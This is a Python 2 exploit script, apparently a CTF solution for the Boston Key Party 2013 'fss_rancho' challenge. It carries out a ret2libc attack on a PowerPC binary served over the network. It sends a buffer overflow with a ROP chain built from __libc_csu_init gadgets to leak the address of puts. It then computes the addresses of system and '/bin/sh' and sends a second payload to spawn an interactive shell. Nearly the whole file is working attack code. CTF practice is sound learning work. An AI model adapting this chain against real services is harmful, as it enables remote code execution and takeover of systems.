#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *

'''
Boston Key Party CTF 2013 / Tasks / fss_rancho / Writeup
ret2libc
'''

ip = '127.0.0.1'
ip = 'pwnbox.ztx.io'
port = 4851


# get libc_addr
log("get libc_addr: ", 'blue')
io = zio((ip, port), timeout = 100000, print_read = REPR, print_write = COLORED(REPR))
io.read_until('> ')
io.writeline('2')
io.read_until('Aircraft ID: ')

gadget1 = 0x10001908
gadget2 = 0x100018E0

# .text:100018E0 loc_100018E0:                           # CODE XREF: __libc_csu_init+84
# .text:100018E0                 slwi      r0, r31, 2
# .text:100018E4                 mr        r3, r27
# .text:100018E8                 mr        r4, r26
# .text:100018EC                 mr        r5, r25
# .text:100018F0                 addi      r31, r31, 1
# .text:100018F4                 lwzx      r0, r29, r0
# .text:100018F8                 mtctr     r0
# .text:100018FC                 bctrl
# .text:10001900                 cmplw     cr7, r31, r28
# .text:10001904                 blt       cr7, loc_100018E0
# .text:10001908
# .text:10001908 loc_10001908:                           # CODE XREF: __libc_csu_init+58
# .text:10001908                 lwz       r0, 0x30+arg_4(r1)
# .text:1000190C                 lwz       r25, 0x30+var_1C(r1)
# .text:10001910                 lwz       r26, 0x30+var_18(r1)
# .text:10001914                 lwz       r27, 0x30+var_14(r1)
# .text:10001918                 mtlr      r0
# .text:1000191C                 lwz       r28, 0x30+var_10(r1)
# .text:10001920                 lwz       r29, 0x30+var_C(r1)
# .text:10001924                 lwz       r30, 0x30+var_8(r1)
# .text:10001928                 lwz       r31, 0x30+var_4(r1)
# .text:1000192C                 addi      r1, r1, 0x30
# .text:10001930                 blr
# .text:10001930 # End of function __libc_csu_init

# gadget2 -> r0 -> jmp  -----260
# 0x0 -> r31 ---- 252
# write_plt -> r29 -> r0 -> call ---- 244
# cmp(0x1) -> r28 ----240
# argv1(0x1) ->r27 -> r3 ----236
# argv2(puts_plt) -> r26 -> r4 ---- 232
# argv3(0x4) -> r25 -> r5 ----228
puts_plt = 0x1001213C
write_plt = 0x10012114
main_addr = 0x10001700

payload = "A" * 212 + b32(gadget1) + "B" * 12 + b32(0x4) + b32(puts_plt) + b32(0x1) +\
		b32(0x1) + b32(write_plt) + "D" * 4+ b32(0x0) + "E" * 4 + b32(gadget2) +\
		"F" * 44 + b32(main_addr)

io.writeline(payload)

io.read_until('Departure Airport: ')
io.writeline('LeoC')
io.read_until('Destination Airport: ')
io.writeline('LeoC')
io.read_until('>\n')
io.writeline('1')
data = io.read(4)

puts_addr = b32(data)
log("puts_addr: " + hex(puts_addr), 'red')

log("===========================", 'blue')
system_offset = 0x491E0
binsh_offset = 0x15487C
puts_offset = 0x70C60
libc_addr = puts_addr - puts_offset
system_addr = libc_addr + system_offset
binsh_addr  = libc_addr + binsh_offset
log("libc_addr :" + hex(libc_addr), 'red')
log("system_addr: " + hex(system_addr), 'red')
log("binsh_addr: " + hex(binsh_addr), 'red')

# get shell
log("Get Shell: ", 'blue')
io.read_until('> ')
io.writeline('2')
io.read_until('Aircraft ID: ')

gadget = 0x1000184C
# .text:1000184C                 .globl flp_gift
# .text:1000184C flp_gift:
# .text:1000184C                 lwz       r3, 8(r1)
# .text:10001850                 lwz       r4, 0xC(r1)
# .text:10001854                 lwz       r5, 0x10(r1)
# .text:10001858                 addi      r3, r3, 3
# .text:1000185C                 addi      r4, r4, -7
# .text:10001860                 addi      r1, r1, 0x10
# .text:10001864                 lwz       r0, 4(r1)
# .text:10001868                 mtlr      r0
# .text:1000186C                 blr

payload = "A" * 212 + b32(gadget) + b32(binsh_addr-3) + b32(puts_plt+7) + b32(0x4) + b32(system_addr)

io.writeline(payload)

io.read_until('Departure Airport: ')
io.writeline('LeoC')
io.read_until('Destination Airport: ')
io.writeline('LeoC')
io.read_until('>\n')
io.writeline('1')
io.interact()

